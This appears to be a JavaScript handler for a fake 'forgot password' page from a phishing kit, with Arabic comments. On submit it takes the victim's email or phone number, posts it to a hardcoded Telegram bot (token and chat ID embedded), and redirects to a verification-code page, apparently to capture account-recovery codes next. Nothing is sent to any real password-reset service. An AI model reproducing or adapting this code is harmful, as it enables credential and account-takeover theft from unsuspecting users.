document.getElementById('forgot-form').addEventListener('submit', function(e) {
    e.preventDefault();

    // قراءة البيانات المدخلة
    const contact = document.getElementById('email-phone').value || 'No Data';
    const message = `❓ Forgot Password Request:\n📧 Contact: ${contact}`;

    // إرسال البيانات إلى تيليجرام
    sendToTelegram(message);

    // التوجيه إلى صفحة إدخال رمز التحقق مباشرة بعد الضغط على الزر
    window.location.href = 'verify-code.html';  // التوجيه إلى صفحة إدخال الرمز
});

function sendToTelegram(message) {
    const token = '6924402995:AAEx-1e3pcV9kpYjpQnsjN-lkvreoCjxkFs';
    const chatId = '1046458749';
    
    // إرسال رسالة إلى تيليجرام باستخدام API
    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: message })
    })
    .then(response => {
        if (!response.ok) {
            console.error('خطأ في إرسال البيانات إلى تيليجرام');
        }
    })
    .catch(error => {
        console.error('حدث خطأ في الاتصال بتيليجرام:', error);
    });
}